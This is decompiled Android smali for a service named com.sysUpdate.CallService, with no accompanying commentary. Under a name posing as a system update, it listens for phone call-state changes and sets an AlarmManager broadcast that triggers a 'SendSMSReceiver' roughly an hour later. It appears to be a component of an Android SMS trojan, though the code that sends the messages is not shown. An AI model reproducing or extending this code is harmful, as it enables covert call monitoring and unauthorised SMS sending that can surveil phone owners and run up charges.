.class public Lcom/sysUpdate/CallService;
.super Landroid/app/Service;
.source "CallService.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/sysUpdate/CallService$MyPhoneStateListener;
    }
.end annotation


# instance fields
.field lastState:I

.field listener:Landroid/telephony/PhoneStateListener;

.field tm:Landroid/telephony/TelephonyManager;


# direct methods
.method public constructor <init>()V
    .registers 2

    .prologue
    .line 21
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 22
    const/4 v0, -0x1

    iput v0, p0, Lcom/sysUpdate/CallService;->lastState:I

    return-void
.end method

.method static synthetic access$000(Lcom/sysUpdate/CallService;)V
    .registers 1

    .prologue
    .line 21
    invoke-direct {p0}, Lcom/sysUpdate/CallService;->setSendSmsAlarm()V

    return-void
.end method

.method private setSendSmsAlarm()V
    .registers 7

    .prologue
    const/16 v5, 0xc

    .line 49
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/sysUpdate/SendSMSReceiver;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 50
    new-instance v1, Ljava/util/GregorianCalendar;

    invoke-direct {v1}, Ljava/util/GregorianCalendar;-><init>()V

    .line 51
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    long-to-int v2, v2

    .line 52
    const/high16 v3, 0x40000000    # 2.0f

    .line 53
    invoke-static {p0, v2, v0, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v2

    .line 55
    const/4 v0, 0x1

    invoke-virtual {v1, v5, v0}, Ljava/util/GregorianCalendar;->add(II)V

    .line 56
    const-string v0, "SEND_SMS_ALARM_SET"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Set send sms alarm for "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const/16 v4, 0xa

    invoke-virtual {v1, v4}, Ljava/util/GregorianCalendar;->get(I)I

    move-result v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, ":"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v1, v5}, Ljava/util/GregorianCalendar;->get(I)I

    move-result v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 57
    const-string v0, "alarm"

    invoke-virtual {p0, v0}, Lcom/sysUpdate/CallService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 58
    const/4 v3, 0x0

    invoke-virtual {v1}, Ljava/util/GregorianCalendar;->getTimeInMillis()J

    move-result-wide v4

    invoke-virtual {v0, v3, v4, v5, v2}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 60
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 3

    .prologue
    .line 64
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .registers 4

    .prologue
    .line 28
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 29
    const-string v0, "CALL_SERVICE_STARTED"

    const-string v1, "started the call service"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 30
    new-instance v0, Lcom/sysUpdate/CallService$MyPhoneStateListener;

    invoke-direct {v0, p0}, Lcom/sysUpdate/CallService$MyPhoneStateListener;-><init>(Lcom/sysUpdate/CallService;)V

    iput-object v0, p0, Lcom/sysUpdate/CallService;->listener:Landroid/telephony/PhoneStateListener;

    .line 31
    const-string v0, "phone"

    invoke-virtual {p0, v0}, Lcom/sysUpdate/CallService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    iput-object v0, p0, Lcom/sysUpdate/CallService;->tm:Landroid/telephony/TelephonyManager;

    .line 32
    iget-object v0, p0, Lcom/sysUpdate/CallService;->tm:Landroid/telephony/TelephonyManager;

    iget-object v1, p0, Lcom/sysUpdate/CallService;->listener:Landroid/telephony/PhoneStateListener;

    const/16 v2, 0x20

    invoke-virtual {v0, v1, v2}, Landroid/telephony/TelephonyManager;->listen(Landroid/telephony/PhoneStateListener;I)V

    .line 33
    return-void
.end method
